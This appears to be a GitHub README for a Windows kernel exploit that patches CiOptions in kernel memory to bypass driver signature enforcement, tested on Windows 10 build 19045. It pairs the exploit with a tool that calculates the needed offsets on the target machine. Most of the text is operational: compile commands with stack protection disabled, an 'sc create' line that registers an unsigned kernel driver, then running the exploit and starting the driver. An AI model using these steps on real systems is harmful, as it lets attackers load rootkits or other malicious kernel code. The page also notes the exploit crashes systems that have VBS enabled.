# KexecDD-gdrv-loader
This is the same KExecDD exploit (https://github.com/floesen/KExecDD).

Rather than having to find the correct NTOSKRNL_WRITE_GADGET and CI_OPTIONS using a debugger for Kernel debugging on the target system, this comes together with a modified version of https://github.com/v1k1ngfr/gdrv-loader to calculate these offsets on the target system. A lot of the `gdrv-loader` code base is left untouched and not really needed.

Note: the stubs for `nt!FsRtlInitializeFileLock` and `ci!CiInitialize` might change in newer versions which might break the offset calculation.
This has been tested on a Windows 10 (Build 19045.4191).

This will cause bsod if ran on a system with Virtualization-based Security (VBS) (https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) enabled.

## Usage

Compile the offsets project and execute the exe on the target system. Get the offsets returned and copied them into the `kexecdd/dllmain.c` and `kexecdd/dllmain_restore.c`:

```
offsets.exe

> Offset CiOptions: 000000000003A478

> Offset asm mov:   0000000000201852
```

Compile the `loader.c`, `dllmain.c` and `dllmain_restore.c` using the x64 Native Tools Command Prompt:

```
cl.exe /nologo /MT /Ox /W0 /GS- /DNDEBUG loader.c /link Advapi32.lib /OUT:exploit.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
cl.exe /LD /nologo /MT /Ox /W0 /GS- /DNDEBUG dllmain.c /link /OUT:exploit.dll /SUBSYSTEM:CONSOLE /MACHINE:x64
cl.exe /LD /nologo /MT /Ox /W0 /GS- /DNDEBUG dllmain_restore.c /link /OUT:restore.dll /SUBSYSTEM:CONSOLE /MACHINE:x64
```

Create the unsigned driver service:

```
sc create unsigned type= kernel binPath= C:\path_to\unsigned.sys
```

Run the exploit:

```
exploit.exe
```

Load the unsigned driver:

```
sc start unsigned
```

Revert the kernel memory patch:

```
exploit.exe 6
```

## More information

Coming soon
